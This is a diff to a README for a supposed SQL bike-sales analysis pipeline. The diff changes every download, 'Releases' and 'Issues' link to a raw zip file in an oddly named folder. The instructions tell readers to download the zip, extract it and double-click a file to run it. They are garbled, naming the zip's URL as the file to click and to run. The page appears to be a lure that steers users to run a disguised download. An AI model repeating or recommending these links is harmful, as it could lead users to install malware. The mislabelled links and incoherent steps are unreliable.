@@ -1,7 +1,7 @@
 # 🛠️ sql-bike-sales-analysis-pipeline - Your Guide to Business Intelligence
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip%20release-brightgreen)](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip)
+[![Download](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip%20release-brightgreen)](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip)
 
 ## 📖 Overview
 The sql-bike-sales-analysis-pipeline project showcases a complete Business Intelligence pipeline for bike sales. It helps users analyze data effectively using SQL. This project includes complex data transformations, a well-structured data warehouse, and insightful analysis to identify key risks and operational issues.
@@ -15,11 +15,11 @@ Follow these steps to download and run the application on your computer.
 - Basic spreadsheet software (like Excel or Google Sheets) to view reports.
 
 ### 📂 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip) to find the latest version of the software.
 2. **Choose the Correct File**: Look for the latest version listed at the top. You will find various files associated with this release.
-3. **Download**: Click on the file named `https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip` to download it. (Replace `v1.0` with the latest version number available).
+3. **Download**: Click on the file named `https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip` to download it. (Replace `v1.0` with the latest version number available).
 4. **Extract the Files**: Once the download completes, locate the file in your Downloads folder. Right-click on the zipped file and select "Extract All…" to unpack the contents.
-5. **Run the Application**: Open the extracted folder. Look for `https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip` file (or similarly named). Double-click this file to start the program. 
+5. **Run the Application**: Open the extracted folder. Look for `https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip` file (or similarly named). Double-click this file to start the program. 
 
 ### 🎨 User Interface
 The user interface is designed to be simple and intuitive. You can easily navigate through the features without prior experience. Key sections include:
@@ -38,7 +38,7 @@ Stay current with the project. Always check for updates on the Releases page. Ne
 
 ## 🌐 Support & Community
 For any questions or support, you can:
-- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip).
+- Open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip).
 - Join discussions in the project’s community forum or chat platforms if available.
 
 ## 🧩 Contributing
@@ -55,4 +55,4 @@ This project is licensed under the MIT License. You are free to use and modify t
 ## 📂 Conclusion
 This application empowers you to analyze bike sales data effectively. Follow the steps above to download and get started with the sql-bike-sales-analysis-pipeline. For detailed inquiries, feel free to explore the community support or contribute to the project. 
 
-[Download Now!](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sql-bike-sales-analysis-pipeline.zip)
+[Download Now!](https://raw.githubusercontent.com/GilsonFelipe/sql-bike-sales-analysis-pipeline/main/subtypical/sales_bike_pipeline_sql_analysis_1.9.zip)
